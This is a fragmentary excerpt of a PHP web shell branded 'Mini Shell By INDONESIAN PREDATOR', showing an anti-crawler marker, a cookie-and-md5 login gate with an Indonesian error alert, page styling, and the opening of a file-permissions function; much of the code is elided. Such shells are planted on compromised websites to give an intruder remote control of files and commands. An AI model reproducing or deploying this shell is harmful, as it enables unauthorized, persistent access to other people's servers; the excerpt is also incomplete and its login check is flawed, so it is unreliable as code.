...
/*------------------ End of Anti Crawler -----*/
    ...
    echo "<link href=data:image/gif;https://i.ibb.co/7pksvzC/20200701-002727.png rel=icon type=image/x-icon />";
    echo "<style>
    html { background:url(https://i.ibb.co/7pksvzC/20200701-002727.png) black; }
    ...
    if($_COOKIE["user"] != $username && $_COOKIE["pass"] != md5($password))
    {
        ...
        else
        {
            if($_POST['usrname'])
            {
                print'<script>alert("UserName/PassWord Salah Gan");</script>';
            }
            echo '<title>Mini Shell INDONESIAN PREDATOR</title><center>
            ...
            <tr><td bgcolor="green"><table cellpadding=\'0\' cellspacing=\'0\' border=\'0\' width=\'100%\'><tr><td bgcolor="green" align=center style="padding:2;padding-bottom:4"><b><font color="white" size=-1 color="white" face="verdana,arial"><b>Mini Shell By INDONESIAN PREDATOR</b></font></th></tr>
...
<title>Mini Shell INDONESIAN PREDATOR</title>
<style>
body{
font-family: "Iceberg";
...
echo '<br /><center><font color="white"></font><font color="red">INDONESIAN PREDATOR</font></center>
</BODY>
</HTML>';
function perms($file){
